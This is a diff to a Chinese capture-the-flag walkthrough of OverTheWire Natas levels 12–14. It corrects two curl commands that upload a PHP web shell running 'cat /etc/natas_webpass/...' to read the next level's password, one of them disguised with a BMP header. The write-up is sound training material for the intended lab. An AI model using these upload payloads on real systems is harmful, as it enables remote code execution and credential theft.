@@ -170,7 +170,7 @@ $ext = pathinfo($fn, PATHINFO_EXTENSION);
 所以用`curl`上次一个`php`去读密码就好了
 
 ```bash
-curl -isu natas12:*** 'http://natas12.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< '<?php passthru("cat etc/natas_webpass/natas13"); ?>'
+curl -isu natas12:*** 'http://natas12.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< '<?php passthru("cat /etc/natas_webpass/natas13"); ?>'
 ```
 
 ##  13-14
@@ -182,7 +182,7 @@ curl -isu natas12:*** 'http://natas12.natas.labs.overthewire.org' -F filename=a.
 把`php`伪装即可，最方便的是`bmp`文件，开头加上`BM`就行了。
 
 ```bash
-curl -isu natas13:****** 'http://natas13.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< 'BM<?php passthru("cat etc/natas_webpass/natas14"); ?>'
+curl -isu natas13:****** 'http://natas13.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< 'BM<?php passthru("cat /etc/natas_webpass/natas14"); ?>'
 ```
 
 **结论**：上传文件要控制住类型。
